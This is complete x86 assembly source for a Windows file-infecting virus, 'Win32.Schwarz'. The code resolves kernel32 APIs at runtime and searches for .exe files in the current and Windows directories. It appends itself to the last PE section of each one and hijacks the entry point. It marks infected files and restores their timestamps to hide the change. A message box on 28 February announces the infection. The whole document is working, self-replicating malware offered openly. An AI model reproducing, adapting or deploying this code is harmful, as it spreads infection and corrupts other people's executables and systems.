   ;*************************************************************************
   ;*                                  *
   ;*      Win32.Schwarz Virus from Energy             *
   ;*                                  *
   ;*************************************************************************



   .386


   .model flat, stdcall

   extrn ExitProcess:proc
   extrn MessageBoxA:proc


   jumps

   .data

   .code

   Mega label byte

   SchwarzStart:     call GetDelta
   Germany  db " Win32.Schwarz by Energy ",0

   GetDelta:
           mov      ebp, [esp]
           sub      ebp, offset GetDelta

   Kernel32:   add      esp, 4h
           mov      eax, [esp]
           xor      ax, ax
   SchwarzIPsec:
               cmp      word ptr [eax],'ZM'
               jz   SchwarzPE

           sub      eax, 1000h
           jmp      SchwarzIPsec
   SchwarzPE:
           mov     esi, [eax + 3Ch]
                   add     esi, eax
                   cmp     word ptr [esi], 'EP'
           jnz     SchwarzIPsec
           mov     [ebp+offset v_K32], eax
   GetProcFind:
           mov     edx, [esi+78h]
           add     edx, eax

           mov     esi, [edx+20h]
           add     esi, eax
           xor ecx, ecx
   line     db " Win32.Schwarz ",0
   Schwarzlinecase:
               mov    edi , [esi]
                   add    edi, eax
               cmp    [edi], dword ptr 'PteG'
               jnz    IPsecz
               cmp    [edi+4h], dword ptr 'Acor'
               jnz    IPsecz
               cmp    [edi+8h], dword ptr 'erdd'
               jnz    IPsecz
               jmp    GetProc

   IPsecz:     add     esi, 4h
           inc     ecx
           jmp     Schwarzlinecase

   GetProc:    mov     ebx, [edx+24h]
           add ebx, eax
           rol     ecx, 1h
           add ebx, ecx
           mov ebx, [ebx]
           shr     ebx, 10h
           dec     ebx
           mov edi, [edx+01ch]
           add edi, eax
           rol     ebx, 2h
           add ebx, edi
           mov     ebx, [ebx]

           add     ebx, eax

           mov     dword ptr [ebp+offset GetP], ebx
           lea      esi, [ebp + offset FireworkApis_start]

           lea      edi, [ebp + offset ClaraApis_start]


   Michelle:   lea      eax, [ebp + offset v_K32]
           mov  eax, [eax]
           lea  ebx, [ebp + offset GetP]
           mov  ebx, [ebx]
           push     esi

           push     eax
           call     ebx
           or   eax, eax
           je   host
           mov      dword ptr [edi], eax
           add  edi, 4h

   Sandy:  inc      esi
           cmp      byte ptr [esi], 00h
           jne  Sandy

           inc  esi

           cmp      byte ptr [esi], 00h
           je       Anja

           jmp      Michelle
   Anja:
           lea      edi, [ebp+ offset n_User32]
           push     edi
           call     dword ptr [ebp + offset v_GetModuleHandleA]
           mov      dword ptr [ebp+offset v_User32 ], eax

           lea      edi, [ebp + offset n_MessageBoxA]

           push     edi
           push     eax

           call     dword ptr [ebp+ offset GetP]

           mov      dword ptr [ebp+offset v_MessageBoxA ], eax


   SchwarzPayload:
           mov  esi, [ebp+ offset v_GetSystemTime]
           lea      edi, [ebp + offset SystemTime]
           push     edi
           call     esi

           cmp      [edi.ST_wMonth], 02h


           jne  SchwarzInfeccion
           cmp      [edi.ST_wDay], 01Ch

           jne      SchwarzInfeccion
           lea      eax, [ebp+offset SchwarzPayload_Tittle]
           lea  ebx, [ebp+offset SchwarzPayload_Message1]
           mov  ecx, [ebp+offset v_MessageBoxA]
           push     20h
           push     eax
           push     ebx
           push     00h
           call     ecx


   SchwarzInfeccion:


   SchwarzDir:
           lea      eax, [ebp+offset WIN32_FIND_DATA]

           lea      ebx, [ebp+offset SchwarzFiles]

           mov  ecx, [ebp+offset v_FindFirstFileA]

           push     eax
           push     ebx
           call     ecx

           inc      eax

           jz   Annette

           dec      eax
           mov      dword ptr [ebp+search_handle], eax

           jmp      Schwarzmember

   Mike:
           mov      eax, dword ptr [ebp+search_handle]
           lea      ebx, dword ptr [ebp + offset WIN32_FIND_DATA]

           mov  ecx, [ebp+offset v_FindNextFileA]

           push     ebx
           push     eax

           call     ecx
           or   eax, eax
           jz   Annette
           jmp  Schwarzmember

   Annette:    cmp      byte ptr [ebp+offset milka],00h
           je   SchwarzWin
           jmp      host
   SchwarzWin:

           mov byte ptr [ebp+offset milka], 01h
           lea     eax, dword ptr [ebp + WindowsDir]
                   push    Max_Path
           push    eax
                   call    dword ptr [ebp + offset v_GetWindowsDirectoryA]

           lea     eax, dword ptr [ebp + WindowsDir]
                   push    eax
                   mov eax, [ebp+offset v_SetCurrentDirectoryA]
           call    eax
               jmp SchwarzDir
   Schwarzmember:

           mov edx, [ebp+ offset Schwarzabcdf]
           cmp edx, 5h
           je  host



   AsttributesChange:

           lea edi, [ebp+ offset WFD_szFileName]
           push    80h
           push    edi
           mov     edi, [ebp+ offset v_SetFileAttributesA]
           call    edi

   SchwarzFileHandle:


           push    0
           push    0
           push    3

           push    0
           push    1
           push    0C0000000h
           lea     eax, [ebp+offset WFD_szFileName]
           push    eax
           mov eax, [v_CreateFileA+ebp]
           call    eax
           inc eax
           or      eax, eax
           jz  Mike
           dec eax
           mov [ebp + offset SchwarzHandle], eax

   SchwarzCMapping:
           mov esi, [ebp+ offset WFD_nFileSizeLow]
           lea ecx, [ebp+offset Mega]
           lea edi, [ebp+offset BigEuro]
           sub edi, ecx
           mov     [ebp+offset SchwarzViralSize], edi
           add edi, esi
           mov [ebp+offset InfectedSize], edi

           push    0

           push    esi
           push    0

           push    04h
           push    0

           push    eax
           mov ebx, [ebp+offset v_CreateFileMappingA]
           call    ebx
           or  eax, eax
           jz  Mike

           mov [ebp+offset SchwarzMapHandle], eax



   SchwarzMapping:

           push    esi
           push    0
           push    0

           push    000F001Fh
           push    eax
           mov eax, [ebp+offset v_MapViewOfFile]
           call    eax
           mov [ebp+ offset SchwarzFile], eax
           or  eax, eax
           jz  Mike
   madeUtilFile:


           cmp     word ptr [eax], 'ZM'
                   jne     Mike
           cmp     word ptr [eax + 08h], 04h
                   jne     Mike
           mov     esi, [eax + 3Ch]
                   add     esi, eax
                   cmp     word ptr [esi], 'EP'
                   jnz     Mike

   madeSchwarzInfected:

           cmp      word ptr [esi+42h], 'yE'
           jnz  Schwarz1234567
           call     SchwarzOfelia
           jmp      Mike


   Schwarz1234567: mov  edx, [ebp+ offset Schwarzabcdf]
           inc  edx
           mov  [ebp+offset Schwarzabcdf], edx

   GetAlignment:
           mov edi, [esi+3Ch]
           mov [ebp+offset Alignment], edi
   GetNewSize:
           xor edx, edx

           mov eax, [ebp+offset InfectedSize]


           div edi

           inc eax

           mul edi
           mov edi, eax


           call    SchwarzOfelia



   SchwarzFileHandle2:


           push    0
           push    0
           push    3

           push    0
           push    1
           push    0C0000000h
           lea     eax, [ebp+offset WFD_szFileName]
           push    eax
           mov eax, [v_CreateFileA+ebp]
           call    eax

           inc eax
           or      eax, eax
           jz  Mike
           dec eax

           mov [ebp + offset SchwarzHandle], eax

   SchwarzCMapping2:



           push    0

           push    edi

           push    0

           push    04h

           push    0

           push    eax

           mov ebx, [ebp+offset v_CreateFileMappingA]
           call    ebx
           or  eax, eax
           jz  Mike
           mov [ebp+offset SchwarzMapHandle], eax



   SchwarzMapping2:


           push    edi

           push    0

           push    0

           push    000F001Fh

           push    eax
           mov eax, [ebp+offset v_MapViewOfFile]

           call    eax

           mov [ebp+ offset SchwarzFile], eax
           or  eax, eax
           jz  Mike

   FindLastSection:
           mov ebx, [eax+3Ch]
           add ebx, eax
           xor esi, esi
           mov si, word ptr [ebx+14h]
           add ebx, 18h
           add esi, ebx


           mov ebx, [ebp+offset SchwarzFile]
           mov ecx, [eax+3ch]
           add ebx, ecx
           xor     ecx, ecx
           mov cx, word ptr [ebx+6h]
           dec     ecx

   Schwarzlast:
           add esi, 28h
           loop    Schwarzlast
   LastSection:
           or      [esi + 24h], 0A0000020h
           mov edi, [ebx+28h]
           push    edi

           mov edi, [esi+10h]
           add edi, [esi+0ch]
           mov [ebx+28h], edi

           push    edi

           mov edi, [esi+10h]
           add edi, [esi+14h]
           add edi, [ebp+offset SchwarzFile]
           mov [ebp+offset flastsection], edi

           mov eax, [esi+10h]
           add eax, [ebp+SchwarzViralSize]


           mov edi, [ebx+3Ch]

           xor edx, edx
           div edi

           inc eax

           mul edi

           mov [esi+10h], eax
           mov [esi+8h], eax


           add eax, [esi+0ch]
           mov [ebx+50h], eax

   Schwarzpraxis:  mov edi, [ebp+offset flastsection]

           lea     esi,[ebp+offset Mega]
           mov     ecx, [ebp+offset SchwarzViralSize]
           rep     movsb

   Schwarzdaniele:




           mov edi, [ebp+offset flastsection]
           pop eax
           pop ecx
           stgt = OldEntryPoint-Mega
           munch = NewEntryPoint-Mega
           mov [edi+stgt], ecx
           mov [edi+munch], eax



   SchwarzMarkInfect:
           mov eax, [ebp+offset SchwarzFile]

           mov ebx, [eax+3ch]
           add eax, ebx

           mov word ptr [eax+42h], 'yE'
           call    SchwarzOfelia

           jmp     Mike
   SchwarzOfelia proc

           push    dword ptr [ebp+ offset SchwarzFile]
           mov eax, [ebp+ offset v_UnmapViewOfFile]
           call    eax

           push    dword ptr [ebp+ offset SchwarzMapHandle]

           mov     eax, [ebp+ offset v_CloseHandle]
           call    eax


   Schwarzspeziell:
           lea eax, dword ptr [ebp+ offset WFD_ftLastWriteTime]
           lea     ebx, dword ptr [ebp+ offset WFD_ftLastAccessTime]
           lea ecx, dword ptr [ebp +offset WFD_ftCreationTime]
           push    eax
           push    ebx
           push    ecx
           mov eax, [ebp + offset SchwarzHandle]
           push    eax
           mov eax, [ebp+offset v_SetFileTime]
           call    eax


   Ofelialogi:
           push    dword ptr [ebp+ offset SchwarzHandle]
           mov     eax, [ebp+ offset v_CloseHandle]
           call    eax
   energy:
           push    dword ptr [ebp+WFD_dwFileAttributes]
           lea eax, [ebp+ WFD_szFileName]
           push    eax
           mov eax, [ebp+offset v_SetFileAttributes]
           call    eax

           ret
   endp


   SchwarzData:



   n_K32                db 'Kernel32.dll',0
   n_User32             db 'User32.dll',0
   v_K32                dd 00h
   GetP                 dd 00h
   v_User32             dd 00h
   SchwarzPayload_Tittle        db ' Win32.Schwarz by Energy ',0
   SchwarzPayload_ContinuezZ        db 'Please reload the file',0

   FireworkApis_start       label byte
   n_FindFirstFileA         db 'FindFirstFileA',0
   n_FindNextFileA          db 'FindNextFileA',0
   n_GetModuleHandleA       db 'GetModuleHandleA',0
   n_GetSystemTime          db 'GetSystemTime',0
   n_CreateFileA            db 'CreateFileA',0
   n_CreateFileMappingA         db 'CreateFileMappingA',0
   n_MapViewOfFile          db 'MapViewOfFile',0
   n_GetWindowsDirectoryA       db 'GetWindowsDirectoryA',0
   n_SetCurrentDirectoryA       db 'SetCurrentDirectoryA',0
   n_SetFileAttributesA         db 'SetFileAttributesA',0
   n_UnmapViewOfFile        db 'UnmapViewOfFile',0
   n_CloseHandle            db 'CloseHandle',0
   n_SetFileTime            db 'SetFileTime',0
   n_SetFileAttributes      db 'SetFileAttributesA',0
   FireworkApis_end             db 00h
   ClaraApis_start      label byte
   v_FindFirstFileA         dd 00h
   v_FindNextFileA          dd 00h
   v_GetModuleHandleA       dd 00h
   v_GetSystemTime          dd 00h
   v_CreateFileA            dd 00h
   v_CreateFileMappingA         dd 00h
   v_MapViewOfFile          dd 00h
   v_GetWindowsDirectoryA       dd 00h
   v_SetCurrentDirectoryA       dd 00h
   v_SetFileAttributesA         dd 00h
   v_UnmapViewOfFile        dd 00h
   v_CloseHandle            dd 00h
   v_SetFileTime            dd 00h
   v_SetFileAttributes      dd 00h
   SchwarzPayload_Message1      db 'Your system is infected by Win32.Schwarz',0Dh
   SchwarzPayload_Continue      db '       Dedicated to Sandy       ',0Dh
   n_MessageBoxA            db 'MessageBoxA',0
   v_MessageBoxA            dd 00h
   SchwarzFiles                       db  '*.exe',0
   Max_Path                         equ 260
   WindowsDir                   db  Max_Path dup (?)
   search_handle            dd  00h
   milka            db  00h
   Schwarzabcdf             dd  00h
   SchwarzHandle            dd  00h
   SchwarzMapHandle             dd  00h
   SchwarzFile          dd  00h
   Alignment            dd  00h
   SchwarzViralSize             dd  00h
   InfectedSize             dd  00h
   flastsection             dd  00h
   OldEntryPoint            dd  00h
   NewEntryPoint            dd  00h
   FILETIME                        struc
           FT_dwLowDateTime        dd               ?
           FT_dwHighDateTime       dd               ?
   FILETIME                        ends
   WIN32_FIND_DATA                 label   byte
       WFD_dwFileAttributes    dd               ?
           WFD_ftCreationTime      FILETIME         ?
           WFD_ftLastAccessTime    FILETIME         ?
           WFD_ftLastWriteTime     FILETIME         ?
           WFD_nFileSizeHigh       dd               ?
           WFD_nFileSizeLow        dd               ?
           WFD_dwReserved0         dd               ?
           WFD_dwReserved1         dd               ?
           WFD_szFileName          db Max_Path dup (?)
           WFD_szAlternateFileName db       13 dup (?)
                                   db       03 dup (?)
   SYSTEMTIME                      struct
           ST_wYear                dw       ?
           ST_wMonth               dw       ?
           ST_wDayOfWeek           dw       ?
           ST_wDay                 dw       ?
           ST_wHour                dw       ?
           ST_wMinute              dw       ?
           ST_wSecond              dw       ?
           ST_wMilliseconds        dw       ?
   SYSTEMTIME                      ends
   SystemTime                SYSTEMTIME     ?
   host:
       cmp  ebp, 0h
       je   FrstGenHost
       call     Schwarzhost
       Schwarzmedica= $-offset Mega
   Schwarzhost proc
   mov eax, Schwarzmedica
   mov ebx, [esp]
   sub ebx, eax
   mov ecx, [ebp+offset NewEntryPoint]
   sub ebx, ecx
   add ebx, [ebp+offset OldEntryPoint]
   jmp ebx
   endp
   BigEuro label byte
   FrstGenHost:
           push     20h
           push     offset line
           push     offset Germany
           push     00h
           call     MessageBoxA
           push     00h
           call ExitProcess
   FIN:
   end SchwarzStart
   end
